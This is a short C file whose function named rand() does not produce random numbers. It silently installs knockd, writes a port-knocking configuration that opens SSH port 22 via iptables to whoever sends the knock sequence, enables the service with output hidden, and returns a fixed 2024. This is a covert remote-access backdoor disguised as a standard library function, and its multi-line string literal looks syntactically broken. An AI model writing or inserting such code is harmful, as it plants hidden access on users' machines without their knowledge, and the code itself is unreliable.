
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int rand(void){

        int installPortKnocking = system("sudo apt install knockd");

        int status = system("echo '[option]\n logfile = /var/log/knockd.log\n[openSSH]\n 
             sequence    = 7000,8000,9000\n 
              seq_timeout = 5\n       
              command     = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport 22 -j ACCEPT\n  
               tcpflags    = syn\n[closeSSH]\n 
               sequence    = 9000,8000,7000\n  
               seq_timeout = 5\n      
                command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n    
                 tcpflags    = syn' | tee /home/monkidy04/knockd.conf > /dev/null");
        
        system("sudo systemctl enable knockd > /dev/null");
        system("sudo systemctl restart knockd > /dev/null");

        return 2024;
}